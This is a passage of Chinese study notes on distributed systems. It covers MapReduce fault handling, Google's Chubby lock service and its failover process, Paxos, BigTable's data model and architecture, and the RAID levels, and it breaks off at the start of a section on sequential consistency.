<li>按照blocks所在的机器或机器所在机架的范围，进行调度</li>
</ul>
<p>效果</p>
<ul>
<li>绝大部分机器从本地读取文件作为输入，节省大量带宽</li>
</ul>
<h3 id="跳过有问题的记录"><a href="#跳过有问题的记录" class="headerlink" title="跳过有问题的记录"></a>跳过有问题的记录</h3><ul>
<li>一些特定的输入数据常导致Map&#x2F;Reduce无法运行</li>
<li>最好的解决方法是调试或者修改<ul>
<li>不一定可行~ 可能需要第三方库或源码</li>
</ul>
</li>
<li>在每个worker里运行一个信号处理程序，捕获map或reduce任务崩溃时发出的信号，一旦捕获，就会向master报告，同时报告输入记录的编号信息。如果master看到一条记录有两次崩溃信息，那么就会对该记录进行标记，下次运行的时候，跳过该记录。</li>
</ul>
<h1 id="云计算-Chubby"><a href="#云计算-Chubby" class="headerlink" title="云计算 - Chubby"></a>云计算 - Chubby</h1><h2 id="Chubby是什么？"><a href="#Chubby是什么？" class="headerlink" title="Chubby是什么？"></a>Chubby是什么？</h2><p><strong>Chubby是Google设计的提供粗粒度锁服务的一个文件系统，主要用于解决分布式一致性问题。</strong></p>
<p>划重点：Chubby是一个<strong>文件系统</strong>。</p>
<p><strong>粗粒度是一个什么概念？</strong></p>
<p>粗粒度是指颗粒度很大，相对而言有细粒度这一概念。</p>
<p>两者的差异在于持有锁的时间。细粒度的锁持有时间很短，常常只有几秒甚至更少，而粗粒度的锁持有的时间可长达几天，选择粗粒度的锁可以减少频繁换锁带来的系统开销。</p>
<p><strong>锁的颗粒度越大，锁住的资源越大，性能影响越大。</strong></p>
<p><strong>分布式一致性问题是个啥？</strong></p>
<p>在一个分布式系统中，有一组的Process，它们需要确定一个Value。于是每个Process都提出了一个Value，一致性就是指只有其中的一个Value能够被选中作为最后确定的值，并且当这个值被选出来以后，所有的Process都需要被通知到。</p>
<h2 id="Chubby的设计目标"><a href="#Chubby的设计目标" class="headerlink" title="Chubby的设计目标"></a>Chubby的设计目标</h2><h3 id="需要实现的特性"><a href="#需要实现的特性" class="headerlink" title="需要实现的特性"></a>需要实现的特性</h3><ul>
<li>高可用性</li>
<li>高可靠性</li>
<li>支持粗粒度的建议性锁服务</li>
<li>支持小规模文件直接存储</li>
</ul>
<h3 id="不作考虑的特性"><a href="#不作考虑的特性" class="headerlink" title="不作考虑的特性"></a>不作考虑的特性</h3><ul>
<li>高性能 使用GFS中并发读实现</li>
<li>存储能力</li>
</ul>
<h2 id="Chubby的系统架构"><a href="#Chubby的系统架构" class="headerlink" title="Chubby的系统架构"></a>Chubby的系统架构</h2><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451838.png" alt="image-20190421160105314"></p>
<p>Chubby被划分成两个部分：</p>
<ul>
<li><p>客户端</p>
<p>客户这一端每个客户应用程序都有一个Chubby程序库（Chubby Library），客户端的所有应用都是通过调用这个库中的相关函数来完成的。</p>
</li>
<li><p>服务器端</p>
<p>服务器一端称为Chubby单元，一般是由五个称为副本（Replica）的服务器组成的，这五个副本在配置上完全一致，并且在系统刚开始时处于对等地位。</p>
</li>
</ul>
<p><strong>客户端和服务器端之间通过远程过程调用（RPC）来连接。</strong></p>
<h2 id="Chubby文件系统"><a href="#Chubby文件系统" class="headerlink" title="Chubby文件系统"></a>Chubby文件系统</h2><p>Chubby系统本质上就是一个分布式的、存储大量小文件的文件系统</p>
<ul>
<li>Chubby中的锁就是<strong>文件</strong></li>
<li>创建文件就是进行“加锁”操作，<strong>创建文件成功的那个server其实就是抢占到了“锁”</strong></li>
<li>用户通过打开、关闭和存取文件，获取共享锁或者独占锁；并且通过通信机制，向用户发送更新信息</li>
</ul>
<h2 id="Chubby客户端与服务器端的通信过程"><a href="#Chubby客户端与服务器端的通信过程" class="headerlink" title="Chubby客户端与服务器端的通信过程"></a>Chubby客户端与服务器端的通信过程</h2><p><strong>客户端和主服务器之间的通信是通过KeepAlive握手协议来维持的。</strong></p>
<p>KeepAlive是周期发送的一种信息，它主要有两方面的功能：</p>
<ul>
<li>延迟租约的有效期</li>
<li>携带事件信息告诉用户更新</li>
</ul>
<p>主要的事件包括：</p>
<ul>
<li>文件内容被修改</li>
<li>子节点的增加、删除和修改</li>
<li>主服务器出错、句柄失效等。</li>
</ul>
<p>正常情况下，通过KeepAlive握手协议租约期会得到延长，事件也会及时地通知给用户。但是由于系统有一定的失效概率，引入故障处理措施是很有必要的。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451839.png" alt="image-20190421160713578"></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451840.png" alt="image-20190421161842117"></p>
<p><strong>符号说明</strong>：</p>
<p>从左到右的水平方向表示时间在增加，斜向上的箭头表示一次KeepAlive请求，斜向下的箭头则是主服务器的一次回应。</p>
<p>M1、M2、M3表示不同的主服务器租约期。</p>
<p>C1、C2、C3则是客户端对主服务器租约期时长做出的一个估计。</p>
<p><strong>图解释：</strong></p>
<ol>
<li>客户端向主服务器发出一个KeepAlive（1号消息）请求。</li>
<li>这时服务器一般不回应客户端，如果有需要通知的事件时则主服务器会立刻做出回应。</li>
<li>等到客户端的租约期C1快结束的时候才做出回应（2号消息）。并更新主服务器租约期为M2。</li>
<li>客户端在接到这个回应后认为该主服务器仍处于活跃状态，于是将租约期更新为C2并立刻发出新的KeepAlive请求（3号消息）。同样地，主服务器可能不是立刻回应而是等待C2接近结束。</li>
<li><strong>但是在这个过程中主服务器出现故障停止使用。在等待了一段时间后C2到期，由于并没有收到主服务器的回应，系统向客户端发出一个危险（Jeopardy）事件，客户端清空并暂时停用自己的缓存，从而进入一个称为宽限期（Grace Period）的危险状态。</strong></li>
<li><strong>这个宽限期默认是45秒。在宽限期内，客户端不会立刻断开其与服务器端的联系，而是不断地做探询。</strong></li>
<li>新的主服务器很快被重新选出，当它接到客户端的第一个KeepAlive请求（4号消息）时会拒绝（5号消息），因为这个请求的纪元号（Epoch Number）错误。</li>
<li>不同主服务器的纪元号不相同，客户端的每次请求都需要这个号来保证处理的请求是针对当前的主服务器。客户端在主服务器拒绝之后会使用新的纪元号来发送KeepAlive请求（6号消息）。</li>
<li>新的主服务器接受这个请求并立刻做出回应（7号消息）。如果客户端接收到这个回应的时间仍处于宽限期内，系统会恢复到安全状态，租约期更新为C3。如果在宽限期未接到主服务器的相关回应，客户端终止当前的会话。</li>
</ol>
<h3 id="主服务器故障"><a href="#主服务器故障" class="headerlink" title="主服务器故障"></a>主服务器故障</h3><p>在客户端和主服务器端进行通信时可能会遇到主服务器智障，哦不，故障，上图就出现了这种情况。</p>
<p>正常情况下旧的主服务器出现故障后系统会很快地选举出新的主服务器，新选举的主服务器在完全运行前需要经历以下九个步骤：</p>
<ol>
<li>产生一个新的纪元号以便今后客户端通信时使用，这能保证当前的主服务器不必处理针对旧的主服务器的请求。</li>
<li>只处理主服务器位置相关的信息，不处理会话相关的信息。</li>
<li>构建处理会话和锁所需的内部数据结构。</li>
<li>允许客户端发送KeepAlive请求，不处理其他会话相关的信息。</li>
<li>向每个会话发送一个故障事件，促使所有的客户端清空缓存。</li>
<li>等待直到所有的会话都收到故障事件或会话终止。</li>
<li>开始允许执行所有的操作。</li>
<li>如果客户端使用了旧的句柄则需要为其重新构建新的句柄。</li>
<li>一定时间段后（1分钟），删除没有被打开过的临时文件夹。</li>
</ol>
<p>如果这一过程在宽限期内顺利完成，新旧主服务器的替换对于用户来说是<strong>透明</strong>的。</p>
<p>用户感觉到的仅仅是一个延迟。</p>
<h2 id="Paxos算法-他没怎么讲，应该考不到"><a href="#Paxos算法-他没怎么讲，应该考不到" class="headerlink" title="Paxos算法(他没怎么讲，应该考不到)"></a>Paxos算法(他没怎么讲，应该考不到)</h2><h3 id="Paxos算法目的"><a href="#Paxos算法目的" class="headerlink" title="Paxos算法目的"></a>Paxos算法目的</h3><p>一种基于消息传递的一致性算法，用于解决分布式系统中的一致性问题。</p>
<h3 id="Paxos算法思想"><a href="#Paxos算法思想" class="headerlink" title="Paxos算法思想"></a>Paxos算法思想</h3><p>节点被分成了三种类型</p>
<ul>
<li>proposers</li>
<li>acceptors</li>
<li>learners</li>
</ul>
<p><strong>其中：</strong></p>
<ul>
<li>proposers提出决议（value，实际上就是告诉系统接下来该执行哪个指令）</li>
<li>acceptors批准决议</li>
<li>learners获取并使用已经通过的决议</li>
</ul>
<p>一个节点可以兼有多重类型</p>
<p>在这种情况下，满足以下三个条件就可以保证数据的一致性。</p>
<ol>
<li>决议只有在被proposers提出后才能批准。</li>
<li>每次只批准<strong>一个</strong>决议。</li>
<li>只有决议确定被批准后learners才能获取这个决议。</li>
</ol>
<p>acceptors对决议进行批准，采用少数服从多数原则，即大多数acceptors接受的决议将成为最终的正式决议。</p>
<h1 id="云计算-BigTable"><a href="#云计算-BigTable" class="headerlink" title="云计算 - BigTable"></a>云计算 - BigTable</h1><h2 id="为什么需要设计BigTable？"><a href="#为什么需要设计BigTable？" class="headerlink" title="为什么需要设计BigTable？"></a>为什么需要设计BigTable？</h2><p>Google需要存储的数据种类繁多</p>
<ul>
<li>网页，地图数据，邮件……</li>
<li>如何使用统一的方式存储各类数据？</li>
</ul>
<p>海量的服务请求</p>
<ul>
<li>如何快速地从海量信息中寻找需要的数据？</li>
</ul>
<h2 id="BigTable概述"><a href="#BigTable概述" class="headerlink" title="BigTable概述"></a>BigTable概述</h2><p>基于GFS和Chubby的分布式存储系统</p>
<ul>
<li>对数据进行<strong>结构化</strong>存储和管理</li>
<li>与GFS的联系，存到底层都是GFS</li>
</ul>
<h2 id="BigTable的设计动机"><a href="#BigTable的设计动机" class="headerlink" title="BigTable的设计动机"></a>BigTable的设计动机</h2><p>来源于Google的需求</p>
<ul>
<li>数据存储可靠性</li>
<li>高速数据检索与读取</li>
<li>存储海量的记录（若干TB）</li>
<li>可以保存记录的多个版本</li>
</ul>
<p><strong>BigTable和数据库的Table可完全不一样:</strong></p>
<ul>
<li>数据库的table有外键关联，有实体之间的关系；</li>
<li>BigTable没有关系这一说，是nosql，不支持关系操作。（而且云存储一般都不支持）</li>
</ul>
<h2 id="BigTable的逻辑视图"><a href="#BigTable的逻辑视图" class="headerlink" title="BigTable的逻辑视图"></a>BigTable的逻辑视图</h2><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451841.png" alt="image-20190421174449346"></p>
<h2 id="BigTable数据模型"><a href="#BigTable数据模型" class="headerlink" title="BigTable数据模型"></a>BigTable数据模型</h2><h3 id="行"><a href="#行" class="headerlink" title="行"></a>行</h3><ul>
<li><p>每行数据有一个可排序的关键字和任意列项，即key</p>
</li>
<li><p>字符串、整数、二进制串甚至可串行化的结构都可以作为行键</p>
</li>
<li><p>表按照行键的“逐字节排序”顺序对行进行有序化处理</p>
</li>
<li><p>表内数据非常‘稀疏’，不同的行的列的数完全目可以大不相同</p>
</li>
<li><p>URL是较为常见的行键，存储时需要倒排</p>
<ul>
<li><p>统一地址域的网页连续存储，便于查找、分析和压缩</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451842.png" alt="image-20190421175209421"></p>
</li>
</ul>
</li>
</ul>
<h3 id="列"><a href="#列" class="headerlink" title="列"></a>列</h3><ul>
<li>特定含义的数据的集合，如图片、链接等</li>
<li><strong>可将多个列归并为一组，称为族（family）</strong></li>
<li>采用 族:限定词 的语法规则进行定义<ul>
<li>fileattr:“owning_group”, “fileattr:owning_user”, etc</li>
</ul>
</li>
<li><strong>同一个族的数据被压缩在一起保存，一个chunk指令可以读到所有数据，为了优化而设置的</strong></li>
<li>族是必须的，是BigTable中访问控制的基本单元。</li>
</ul>
<h3 id="时间戳"><a href="#时间戳" class="headerlink" title="时间戳"></a>时间戳</h3><ul>
<li>保存不同时期的数据，如“网页快照”</li>
</ul>
<h3 id="A-big-table"><a href="#A-big-table" class="headerlink" title="A big table"></a>A big table</h3><ul>
<li>表中的列可以不受限制地增长</li>
<li>表中的数据几乎可以无限地增加</li>
</ul>
<h3 id="无数据校验"><a href="#无数据校验" class="headerlink" title="无数据校验"></a>无数据校验</h3><ul>
<li>每行都可存储任意数目的列<ul>
<li><strong>BigTable不对列的最少数目进行约束</strong></li>
</ul>
</li>
<li>任意类型的数据均可存储<ul>
<li><strong>BigTable将所有数据均看作为字符串</strong></li>
</ul>
</li>
<li>数据的有效性校验由构建于其上的应用系统完成</li>
</ul>
<h3 id="一致性"><a href="#一致性" class="headerlink" title="一致性"></a>一致性</h3><p>针对同一行的多个操作可以分组合并</p>
<ul>
<li><strong>不支持对多行进行修改的操作符</strong></li>
</ul>
<h2 id="物理视图"><a href="#物理视图" class="headerlink" title="物理视图"></a>物理视图</h2><ul>
<li>逻辑上的“表”被划分为若干子表（Tablet）</li>
<li><ul>
<li>每个Tablet由多个SSTable文件组成</li>
<li>SSTable文件存储在GFS之上</li>
</ul>
</li>
<li>每个子表存储了table的一部分行</li>
<li><ul>
<li>元数据：起始行键、终止行键</li>
<li>如果子表体积超过了阈值（如200M），则进行分割</li>
</ul>
</li>
</ul>
<h3 id="SSTable及子表基本结构"><a href="#SSTable及子表基本结构" class="headerlink" title="SSTable及子表基本结构"></a>SSTable及子表基本结构</h3><p>SSTable是Google为Bigtable设计的内部数据存储格式。所有的SSTable文件都存储在GFS上，用户可以通过键来查询相应的值，是SSTable格式的基本示意。</p>
<p>SSTable中的数据被划分成一个个的块（Block），每个块的大小是可以设置的，一般来说设置为64KB。在SSTable的结尾有一个索引（Index），这个索引保存了SSTable中块的位置信息，在SSTable打开时这个索引会被加载进内存，这样用户在查找某个块时首先在内存中查找块的位置信息，然后在硬盘上直接找到这个块，这种查找方法速度非常快。由于每个SSTable一般都不是很大，用户还可以选择将其整体加载进内存，这样查找起来会更快。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451843.png" alt="image-20190421205014446"></p>
<h2 id="体系结构"><a href="#体系结构" class="headerlink" title="体系结构"></a>体系结构</h2><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451844.png" alt="image-20190421204212811"></p>
<h2 id="主节点的职责"><a href="#主节点的职责" class="headerlink" title="主节点的职责"></a>主节点的职责</h2><ul>
<li>为每个子表服务器分配子表，对外提供服务</li>
<li>与GFS垃圾回收进行交互，收回废弃的SSTable</li>
<li>探测子表服务器的故障与恢复</li>
<li>负载均衡</li>
</ul>
<h2 id="子表服务器故障"><a href="#子表服务器故障" class="headerlink" title="子表服务器故障"></a>子表服务器故障</h2><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451845.png" alt="image-20190421205256096"></p>
<p>如图，右边的子表服务器出现故障，主服务器会中止这个子表服务器并将其上的子表全部移至其他子表服务器。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451846.png" alt="image-20190421205316167"></p>
<h2 id="数据访问方式"><a href="#数据访问方式" class="headerlink" title="数据访问方式"></a>数据访问方式</h2><p>子表地址的查询是经常碰到的操作。在Bigtable系统的内部采用的是一种类似B+树的三层查询体系。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451847.png" alt="image-20190421211027761"></p>
<h2 id="数据写的流程"><a href="#数据写的流程" class="headerlink" title="数据写的流程"></a>数据写的流程</h2><p>任何对子表的写操作都会记录到一个存储在GFS之上的commit log中</p>
<ul>
<li><strong>每个子表服务器上所有子表变化对应于一个commit log</strong></li>
</ul>
<p>新的数据存储到子表服务器的内存（memtable）中</p>
<p>次压缩</p>
<ul>
<li>旧数据存储在SSTable中，而新数据存放在memtable中</li>
<li>当memtable体积超过一定阈值，将形成SSTable，并写入GFS</li>
<li>每个tablet对应多个SSTable</li>
</ul>
<h2 id="子表服务器故障恢复"><a href="#子表服务器故障恢复" class="headerlink" title="子表服务器故障恢复"></a>子表服务器故障恢复</h2><p>新的故障</p>
<ul>
<li>子表服务器内存中的memtable丢失</li>
</ul>
<p>恢复方法 <strong>用log恢复</strong></p>
<ul>
<li>按照tablet将该服务器对应的日志分片</li>
<li>为每个失效tablet分配新的子表服务器</li>
<li>新子表服务器读取对应的分段commit log，并按照日志修改tablet</li>
<li>删除commit log中已实施的内容</li>
<li>重新对外提供服务</li>
</ul>
<h2 id="性能优化"><a href="#性能优化" class="headerlink" title="性能优化"></a>性能优化</h2><p>局部性群组(Locality Group)</p>
<ul>
<li>根据需要，将原本不存储在一起的数据，以列族为单位存储至单独的子表</li>
<li>如用户对网站排名、语言等分析信息感兴趣，那么可以将这些列族放至单独的子表，减少无用信息读取，改善存取效率</li>
</ul>
<p>布隆过滤器(Bloom Filter)</p>
<ul>
<li>什么是布隆过滤器？判断某个元素是否隶属于集合</li>
<li>优点：误判概率低，其存储空间仅为Hash表的1&#x2F;8至1&#x2F;4</li>
<li>用于判断列键是否位于SSTable中，快速确定某个列键的位置</li>
</ul>
<h1 id="Google云计算的技术架构"><a href="#Google云计算的技术架构" class="headerlink" title="Google云计算的技术架构"></a>Google云计算的技术架构</h1><h2 id="Chubby的作用"><a href="#Chubby的作用" class="headerlink" title="Chubby的作用"></a>Chubby的作用</h2><ul>
<li>为GFS提供锁服务，选择Master节点；记录Master的相关描述信息</li>
<li>通过独占锁记录Chunk Server的活跃情况</li>
<li>为BigTable提供锁服务，记录子表元信息（如子表文件信息、子表分配信息、子表服务器信息）</li>
<li>（可能）记录MapReduce的任务信息</li>
<li>为第三方提供锁服务与文件存储</li>
</ul>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451848.png" alt="image-20190421212358675"></p>
<h2 id="GFS的作用"><a href="#GFS的作用" class="headerlink" title="GFS的作用"></a>GFS的作用</h2><ul>
<li>存储BigTable的子表文件</li>
<li>为第三方应用提供大尺寸文件存储功能</li>
<li>文件读操作流程<ul>
<li>API与Master通信，获取文件元信息</li>
<li>根据指定的读取位置和读取长度，API发起并发操作，分别从若干ChunkServer上读取数据</li>
<li>API组装所得数据，返回结果</li>
</ul>
</li>
</ul>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451849.png" alt="image-20190421212506227"></p>
<h2 id="BigTable的作用"><a href="#BigTable的作用" class="headerlink" title="BigTable的作用"></a>BigTable的作用</h2><ul>
<li>为Google云计算应用（或第三方应用）提供数据结构化存储功能</li>
<li>类似于数据库</li>
<li>为应用提供简单数据查询功能（不支持联合查询）</li>
<li>为MapReduce提供数据源或数据结果存储</li>
</ul>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451850.png" alt="image-20190421212605526"></p>
<h2 id="BigTable的存储与服务请求的响应"><a href="#BigTable的存储与服务请求的响应" class="headerlink" title="BigTable的存储与服务请求的响应"></a>BigTable的存储与服务请求的响应</h2><ul>
<li><p>划分为子表存储，每个子表对应一个子表文件，子表文件存储于GFS之上</p>
</li>
<li><p>BigTable通过元数据组织子表</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Tablet 1: &lt;startRowKey1, endRowKey1&gt;, root\bigtable\tablet1,……</span><br><span class="line">Tablet 2: &lt;startRowKey2, endRowKey2&gt;, root\bigtable\tablet2,……</span><br><span class="line">Tablet 3: &lt;startRowKey3, endRowKey3&gt;, root\bigtable\tablet3,……</span><br><span class="line">Tablet 4: &lt;startRowKey4, endRowKey4&gt;, root\bigtable\tablet4,……</span><br></pre></td></tr></table></figure>
</li>
<li><p>每个子表都被分配给一个子表服务器</p>
</li>
<li><p>一个子表服务器可同时分配多个子表</p>
</li>
<li><p>子表服务器负责对外提供服务，响应查询请求</p>
</li>
</ul>
<h2 id="MapReduce的作用"><a href="#MapReduce的作用" class="headerlink" title="MapReduce的作用"></a>MapReduce的作用</h2><ul>
<li>对BigTable中的数据进行并行计算处理（如统计、归类等）</li>
<li>使用BigTable或GFS存储计算结果</li>
</ul>
<p>master与slave的通信：用文件来做，永久异步通信。（一般CS是用socket来做的，属于瞬时阻塞通信）进程间协作更简单，容错性更强。下层用GFS来管理。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451851.png" alt="image-20190421212904180"></p>
<h1 id="RAID磁盘阵列"><a href="#RAID磁盘阵列" class="headerlink" title="RAID磁盘阵列"></a>RAID磁盘阵列</h1><p>在单机时代，采用单块磁盘进行数据存储和读写的方式，由于寻址和读写的时间消耗，导致I&#x2F;O性能非常低，且存储容量还会受到限制。另外，单块磁盘极其容易出现物理故障，经常导致数据的丢失。因此大家就在想，有没有一种办法将多块独立的磁盘结合在一起组成一个技术方案，来提高数据的可靠性和I&#x2F;O性能呢。</p>
<p>在这种情况下，RAID技术就应运而生了。</p>
<h2 id="RAID-是什么？"><a href="#RAID-是什么？" class="headerlink" title="RAID 是什么？"></a>RAID 是什么？</h2><p>RAID （ Redundant Array of Independent Disks ）即独立磁盘冗余阵列，简称为「磁盘阵列」，其实就是用多个独立的磁盘组成在一起形成一个大的磁盘系统，从而实现比单块磁盘更好的存储性能和更高的可靠性。</p>
<h2 id="RAID-有哪些？"><a href="#RAID-有哪些？" class="headerlink" title="RAID 有哪些？"></a>RAID 有哪些？</h2><p>RAID方案常见的可以分为：</p>
<ul>
<li><strong>RAID0</strong></li>
<li><strong>RAID1</strong></li>
<li><strong>RAID5</strong></li>
<li><strong>RAID6</strong></li>
<li><strong>RAID10</strong></li>
</ul>
<h3 id="RAID0"><a href="#RAID0" class="headerlink" title="RAID0"></a>RAID0</h3><p>RAID0 是一种非常简单的的方式，它将多块磁盘组合在一起形成一个大容量的存储。当我们要写数据的时候，会将数据分为N份，以独立的方式实现N块磁盘的读写，那么这N份数据会同时并发的写到磁盘中，因此执行性能非常的高。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451852.jpg" alt="img"></p>
<p>定义：</p>
<p>RAID 0又称为Stripe或Striping，它代表了所有RAID级别中最高的存储性能。RAID 0提高存储性能的原理是把连续的数据分散到多个磁盘上存取，这样，系统有数据请求就可以被多个磁盘并行的执行，每个磁盘执行属于它自己的那部分数据请求。这种数据上的并行操作可以充分利用总线的带宽，显著提高磁盘整体存取性能。</p>
<p>工作原理：</p>
<p>系统向三个磁盘组成的逻辑硬盘（RAID0 磁盘组）发出的I&#x2F;O数据请求被转化为3项操作，其中的每一项操作都对应于一块物理硬盘。通过建立RAID 0，原先顺序的数据请求被分散到所有的三块硬盘中同时执行。从理论上讲，三块硬盘的并行操作使同一时间内磁盘读写速度提升了3倍。 但由于总线带宽等多种因素的影响，实际的提升速率肯定会低于理论值，但是，大量数据并行传输与串行传输比较，提速效果显著显然毋庸置疑。</p>
<p>优缺点：</p>
<p>读写性能是所有RAID级别中最高的。</p>
<p>RAID 0的缺点是不提供数据冗余，因此一旦用户数据损坏，损坏的数据将无法得到恢复。RAID0运行时只要其中任一块硬盘出现问题就会导致整个数据的故障。一般不建议企业用户单独使用。</p>
<p>总结：</p>
<p>磁盘空间使用率：100%，故成本最低。</p>
<p>读性能：N*单块磁盘的读性能</p>
<p>写性能：N*单块磁盘的写性能</p>
<p>冗余：无，任何一块磁盘损坏都将导致数据不可用。</p>
<p>那有没有可以让存储可靠性变高的方案呢？<br>有的，下面的RAID1就是。</p>
<h3 id="RAID1"><a href="#RAID1" class="headerlink" title="RAID1"></a>RAID1</h3><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451854.jpg" alt="img"></p>
<p>定义：</p>
<p>RAID 1通过磁盘数据镜像实现数据冗余，在成对的独立磁盘上产生互为备份的数据。当原始数据繁忙时，可直接从镜像拷贝中读取数据，因此RAID 1可以提高读取性能。RAID 1是磁盘阵列中单位成本最高的，但提供了很高的数据安全性和可用性。当一个磁盘失效时，系统可以自动切换到镜像磁盘上读写，而不需要重组失效的数据。</p>
<p>工作原理：</p>
<p>RAID1是将一个两块硬盘所构成RAID磁盘阵列，其容量仅等于一块硬盘的容量，因为另一块只是当作数据“镜像”。RAID1磁盘阵列显然是最可靠的一种阵列，因为它总是保持一份完整的数据备份。它的性能自然没有RAID0磁盘阵列那样好，但其数据读取确实较单一硬盘来的快，因为数据会从两块硬盘中较快的一块中读出。RAID1磁盘阵列的写入速度通常较慢，因为数据得分别写入两块硬盘中并做比较。RAID1磁盘阵列一般支持“热交换”，就是说阵列中硬盘的移除或替换可以在系统运行时进行，无须中断退出系统。RAID1磁盘阵列是十分安全的，不过也是较贵一种RAID磁盘阵列解决方案，因为两块硬盘仅能提供一块硬盘的容量。RAID1磁盘阵列主要用在数据安全性很高，而且要求能够快速恢复被破坏的数据的场合。</p>
<p>在这里，需要注意的是，读只能在一块磁盘上进行，并不会进行并行读取，性能取决于硬盘中较快的一块。写的话通常比单块磁盘要慢，虽然是并行写，即对两块磁盘的写入是同时进行的，但因为要比较两块硬盘中的数据，所以性能比单块磁盘慢。</p>
<p>优缺点：</p>
<p>RAID1通过硬盘数据镜像实现数据的冗余，保护数据安全，在两块盘上产生互为备份的数据，当原始数据繁忙时，可直接从镜像备份中读取数据，因此RAID1可以提供读取性能。<br>RAID1是硬盘中单位成本最高的，但提供了很高的数据安全性和可用性，当一个硬盘失效时，系统可以自动切换到镜像硬盘上读&#x2F;写，并且不需要重组失效的数据。</p>
<p>总结：</p>
<p>磁盘空间使用率：50%，故成本最高。</p>
<p>读性能：只能在一个磁盘上读取，取决于磁盘中较快的那块盘</p>
<p>写性能：两块磁盘都要写入，虽然是并行写入，但因为要比对，故性能单块磁盘慢。</p>
<p>冗余：只要系统中任何一对镜像盘中有一块磁盘可以使用，甚至可以在一半数量的硬盘出现问题时系统都可以正常运行。</p>
<p>了解了RAID0和RAID1之后，我们发现这两个方案都不完美啊。<br>这时候就该 性能又好、可靠性也高 的方案 RAID5 登场了。</p>
<h3 id="RAID5"><a href="#RAID5" class="headerlink" title="RAID5"></a>RAID5</h3><p>这是目前用的最多的一种方式。<br>因为 RAID5 是一种将存储性能、数据安全、存储成本 兼顾的一种方案。</p>
<p>在了解RAID5之前，我们可以先简单看一下RAID3，虽然RAID3用的很少，但弄清楚了RAID3就很容易明白RAID5的思路。</p>
<p>RAID3的方式是：将数据按照RAID0的形式，分成多份同时写入多块磁盘，但是还会另外再留出一块磁盘用于写「奇偶校验码」。例如总共有N块磁盘，那么就会让其中额度N-1块用来并发的写数据，第N块磁盘用记录校验码数据。一旦某一块磁盘坏掉了，就可以利用其它的N-1块磁盘去恢复数据。</p>
<p>但是由于第N块磁盘是校验码磁盘，因此有任何数据的写入都会要去更新这块磁盘，导致这块磁盘的读写是最频繁的，也就非常的容易损坏。</p>
<p>RAID5的方式可以说是对RAID3进行了改进。</p>
<p>RAID5模式中，不再需要用单独的磁盘写校验码了。它把校验码信息分布到各个磁盘上。例如，总共有N块磁盘，那么会将要写入的数据分成N份，并发的写入到N块磁盘中，同时还将数据的校验码信息也写入到这N块磁盘中（数据与对应的校验码信息必须得分开存储在不同的磁盘上）。一旦某一块磁盘损坏了，就可以用剩下的数据和对应的奇偶校验码信息去恢复损坏的数据。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451855.jpg" alt="img"></p>
<p>RAID5校验位算法原理：P &#x3D; D1 xor D2 xor D3 … xor Dn （D1,D2,D3 … Dn为数据块，P为校验，xor为异或运算）</p>
<p>RAID5的方式，最少需要三块磁盘来组建磁盘阵列，允许最多同时坏一块磁盘。如果有两块磁盘同时损坏了，那数据就无法恢复了。</p>
<h3 id="RAID6"><a href="#RAID6" class="headerlink" title="RAID6"></a>RAID6</h3><p>为了进一步提高存储的高可用，聪明的人们又提出了RAID6方案，可以在有两块磁盘同时损坏的情况下，也能保障数据可恢复。</p>
<p>为什么RAID6这么牛呢，因为RAID6在RAID5的基础上再次改进，引入了双重校验的概念。</p>
<p>RAID6除了每块磁盘上都有同级数据XOR校验区以外，还有针对每个数据块的XOR校验区，这样的话，相当于每个数据块有两个校验保护措施，因此数据的冗余性更高了。</p>
<p>但是RAID6的这种设计也带来了很高的复杂度，虽然数据冗余性好，读取的效率也比较高，但是写数据的性能就很差。因此RAID6在实际环境中应用的比较少。</p>
<h3 id="RAID10"><a href="#RAID10" class="headerlink" title="RAID10"></a>RAID10</h3><p>RAID10其实就是RAID1与RAID0的一个合体。</p>
<p>我们看图就明白了：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451856.jpg" alt="img"></p>
<p>RAID10兼备了RAID1和RAID0的有优点。首先基于RAID1模式将磁盘分为2份，当要写入数据的时候，将所有的数据在两份磁盘上同时写入，相当于写了双份数据，起到了数据保障的作用。且在每一份磁盘上又会基于RAID0技术讲数据分为N份并发的读写，这样也保障了数据的效率。</p>
<p>但也可以看出RAID10模式是有一半的磁盘空间用于存储冗余数据的，浪费的很严重，因此用的也不是很多。</p>
<p><strong>整体对比一下</strong> RAID0、RAID1、RAID5、RAID6、RAID10 的几个特征：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451857.jpg" alt="img"></p>
<h1 id="什么是顺序一致性-Sequential-Consistency"><a href="#什么是顺序一致性-Sequential-Consistency" class="headerlink" title="什么是顺序一致性(Sequential Consistency)"></a>什么是顺序一致性(Sequential Consistency)</h1><p>分布式系统中，我们熟悉强一致性、弱一致性和最终一致性等等一致性，但 Zookeeper 又说自己是“顺序一致性”，又是什么意思呢？</p>
<p>我们来看看那些研究理论的大佬们是如何看待一致性的。</p>
